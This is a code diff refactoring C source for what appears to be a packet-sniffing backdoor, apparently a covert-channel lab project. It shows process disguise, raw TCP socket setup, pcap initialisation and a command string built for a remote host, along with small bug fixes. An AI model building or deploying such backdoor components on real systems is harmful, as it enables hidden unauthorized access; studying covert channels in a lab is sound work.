@@ -11,17 +11,13 @@ int main(int argc, char** argv)
     PcapInfo *pcap_ptr;
     int opt;
     pthread_t ThreadID, ThreadID2;
-    char *nic_dev; 
-    char errbuf[PCAP_ERRBUF_SIZE];
-    bpf_u_int32 maskp;          // subnet mask    
-    unsigned int iseed = (unsigned int)time(NULL);    // use the current time as the random seed value
 
-    disguise();
-    checkArgs();
-    initializeDoor();
+    disguise(argv);
+    checkArgs(argc, argv);
+    initializeDoor(Addr_Ptr);
     setConfig();
-    initializePcap();
-    initializeSocket();
+    initializePcap(pcap_ptr, Addr_Ptr);
+    initializeSocket(Addr_Ptr);
     setupSignals();
 
     //authenticateClient();
@@ -33,7 +29,7 @@ int main(int argc, char** argv)
     return 0;
 }
 
-void initializeSocket()
+void initializeSocket(AddrInfo *Addr_Ptr)
 {
     int arg;
     Addr_Ptr->RawSocket = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -43,8 +39,13 @@ void initializeSocket()
         perror("setsockopt");
 }
 
-void initializePcap()
+void initializePcap(PcapInfo *pcap_ptr, AddrInfo *Addr_Ptr)
 {
+    char *nic_dev; 
+    char errbuf[PCAP_ERRBUF_SIZE];
+    bpf_u_int32 maskp;          // subnet mask    
+
+
     if ((pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
     {
         perror ("malloc");
@@ -63,8 +64,9 @@ void initializePcap()
     snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD, Addr_Ptr->DstHost, Addr_Ptr->dport);
 }
 
-void initializeDoor()
+void initializeDoor(AddrInfo *Addr_Ptr)
 {
+    unsigned int iseed = (unsigned int)time(NULL);    // use the current time as the random seed value
     // seed random number generator
     srand(iseed)
 
@@ -75,7 +77,7 @@ void initializeDoor()
     Addr_Ptr->sport = rand()% 40000 + 2000; // Default (Random) Source Port between 2000 and 60000
 }
 
-void checkArgs(int argc, int **argv)
+void checkArgs(int argc, char **argv)
 {
     if (argc < 2)
     {
@@ -85,7 +87,7 @@ void checkArgs(int argc, int **argv)
 
 void usage(char ** argv)
 {
-    printf("you done goofed!\n")
+    printf("you done goofed!\n");
     printf("try again!\n");
 }
 
